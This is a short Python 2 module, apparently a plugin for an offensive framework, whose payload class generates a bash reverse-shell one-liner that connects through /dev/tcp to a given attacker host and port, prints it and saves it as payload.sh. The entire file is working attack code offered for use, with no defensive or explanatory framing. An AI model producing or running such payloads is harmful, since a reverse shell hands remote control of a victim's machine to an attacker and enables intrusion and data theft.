from modules import helper as h
class payload:
	def __init__(self):
		self.name = "bash"
		self.description = "creates a bash payload"
		self.usage = "run in terminal"

	def run(self,server):
		print h.WHITE + "-"*40 + h.ENDC
		payload_text = "bash &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"
		print h.COLOR_INFO+payload_text+h.ENDC
		payload_write_file = open("payload.sh", "w")
		payload_write_file.write(payload_text)
		payload_write_file.close()
		print "\npayload saved as 'payload.sh'"
		print h.WHITE + "-"*40 + h.ENDC
